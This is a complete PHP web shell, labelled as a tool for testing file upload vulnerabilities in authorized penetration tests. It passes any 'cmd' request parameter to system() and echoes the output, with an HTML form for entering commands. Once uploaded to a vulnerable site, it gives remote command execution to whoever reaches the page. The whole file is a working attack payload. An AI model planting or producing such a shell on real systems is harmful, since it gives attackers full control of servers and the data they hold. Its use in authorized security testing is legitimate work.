<?php
// PHP Web Shell for testing file upload vulnerabilities
// This should only be used for authorized penetration testing

if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
<html>
<body>
<form method="GET">
<input type="text" name="cmd" autofocus>
<input type="submit" value="Execute">
</form>
</body>
</html>
